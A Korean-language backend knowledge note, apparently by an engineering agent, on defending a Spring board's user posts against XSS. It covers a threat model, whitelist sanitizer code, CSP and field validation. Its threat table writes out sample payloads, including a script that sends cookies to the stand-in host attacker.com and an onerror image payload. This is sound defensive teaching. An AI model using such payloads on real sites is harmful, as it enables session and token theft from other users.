---
title: "XSS 방어 — UGC content"
kind: knowledge
project: backend
agent: engineering-agent/tech-lead
status: current
created_at: 2026-05-15T13:42:00+09:00
tags:
  - backend
  - java-spring
  - api-design
  - board
  - security
  - xss
---

# XSS 방어 — UGC content

| 문서 버전 | 작성일 | 작성자 | 주요 변경 사항 |
| --- | --- | --- | --- |
| v1.0.0 | 2026-05-15 | engineering-agent/tech-lead | 최초 |

**[[security|↑ security hub]]**

> 사용자 글 / 댓글 의 XSS 가드. board 의 가장 critical 한 보안.

---

## 1. 위협 모델

| 시나리오 | 영향 |
| --- | --- |
| 글 content 에 `<script>fetch('//attacker.com', cookie)</script>` | 다른 user 의 cookie / JWT 탈취 |
| 댓글 에 `<img src=x onerror=alert(1)>` | session 조작 |
| title 에 `"><script>...</script>` | HTML 구조 깨기 |
| profile / nickname 에 `<a href="javascript:...">` | 링크 클릭 시 |
| 검색 query 에 `<script>...` | reflected XSS (응답 그대로) |

---

## 2. 방어 layer

```mermaid
flowchart TD
    Input[사용자 입력] --> L1[Layer 1: Bean Validation<br/>length / format]
    L1 --> L2[Layer 2: 도메인 검증<br/>VO compact constructor]
    L2 --> L3[Layer 3: 저장<br/>markdown raw (sanitize X)]
    L3 --> L4[Layer 4: 렌더링<br/>markdown → HTML<br/>OWASP HTML Sanitizer]
    L4 --> L5[Layer 5: CSP 헤더<br/>script-src 'self']
    L5 --> Browser[Browser 표시]

    style L4 fill:#fef3c7
    style L5 fill:#fecaca
```

---

## 3. OWASP HTML Sanitizer

```java
@Component
public class MarkdownRenderer {

    private final Parser parser = Parser.builder().build();
    private final HtmlRenderer renderer = HtmlRenderer.builder().build();

    private static final PolicyFactory POLICY = new HtmlPolicyBuilder()
        // 허용 element
        .allowElements("p", "br", "b", "i", "em", "strong", "u", "s",
                       "a", "code", "pre",
                       "blockquote", "ul", "ol", "li",
                       "h1", "h2", "h3", "h4", "h5", "h6",
                       "img", "table", "thead", "tbody", "tr", "td", "th")
        // a, img 의 attribute
        .allowAttributes("href").onElements("a")
        .allowAttributes("src", "alt", "width", "height").onElements("img")
        // URL 정책
        .allowUrlProtocols("https", "mailto")    // http / javascript 차단
        .requireRelNofollowOnLinks()              // SEO 보호
        // 외부 이미지 차단 (옵션)
        .allowAttributes("src").matching(Pattern.compile("^https://cdn\\.example\\.com/.*"))
            .onElements("img")
        .toFactory();

    public String render(String markdown) {
        var node = parser.parse(markdown);
        var rawHtml = renderer.render(node);
        return POLICY.sanitize(rawHtml);
    }
}
```

### 3.1 왜 whitelist (blacklist X)

- whitelist = "이것만" — 새 HTML element 자동 차단.
- blacklist = "이것 제외" — 새 element / attribute 누락 가능.

### 3.2 왜 `https` 만 (URL protocol)

- `javascript:` / `data:` = XSS 가능.
- `http:` = mixed content (HTTPS site 에서 차단).

### 3.3 왜 외부 이미지 src 차단 (옵션)

- 사용자가 `<img src="https://attacker.com/track.gif">` 입력.
- 외부 server 가 viewer 의 IP / Referer 추적.
- CDN 의 own URL 만 허용.

자세히: [[../design-decisions/content-format#4]].

---

## 4. 검색 query / URL parameter

```java
@GetMapping("/posts")
public Page<PostResponse> search(@RequestParam @Size(max = 100) String q, ...) {
    // q 는 SQL 의 parameterized — XSS 위협 X (DB 만)
    // 응답에 q 그대로 echo 시 → reflected XSS
    return new SearchResponse(posts, htmlEscape(q));
}
```

→ 응답에 사용자 입력 echo 시 escape.

---

## 5. CSP 헤더

```yaml
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' https://cdn.example.com data:;
  frame-ancestors 'none';
```

→ 위반 발생 시 script 실행 X (XSS 발생해도 mitigation).

자세히: [[../../signup/security/transport-security#6 CSP]].

---

## 6. nickname / title 등 짧은 field

```java
@NotBlank @Size(max = 30)
@Pattern(regexp = "^[\\p{L}\\p{N}_]+$",
         message = "한글/영문/숫자/_ 만 허용")
String nickname;
```

- 짧은 field 는 markdown X — plain text.
- 응답 시 escape (Jackson 자동).
- HTML 입력 → Pattern reject.

---

## 7. 함정

### 함정 1 — 저장 시 sanitize
원본 손실 → 재편집 / migration 어려움.
→ 저장 raw, 렌더링 시 sanitize.

### 함정 2 — Blacklist sanitize
새 element / attribute 무방비.
→ whitelist.

### 함정 3 — `javascript:` URL 허용
XSS.
→ https / mailto 만.

### 함정 4 — CSP 없음
XSS 발생 시 mitigation 없음.
→ default-src 'self'.

### 함정 5 — 검색 query 응답에 그대로 echo
reflected XSS.
→ htmlEscape() 또는 frontend escape.

### 함정 6 — nickname 에 HTML 가능
다른 user 의 list 화면에서 영향.
→ Pattern 검증.

### 함정 7 — img src 외부 허용
viewer tracking + 외부 server 부담.
→ CDN URL 만.

### 함정 8 — `rel="nofollow"` 누락
사용자 글의 spam link 가 SEO 망침.
→ 강제.

### 함정 9 — 렌더링 결과 cache 없이 매번 parse
CPU 부담.
→ Redis cache 또는 DB rendered_html 컬럼.

---

## 8. 관련

- [[security|↑ hub]]
- [[../design-decisions/content-format]] — markdown + sanitize
- [[../../signup/security/transport-security#6 CSP]]
- 외부 — OWASP XSS Prevention Cheat Sheet
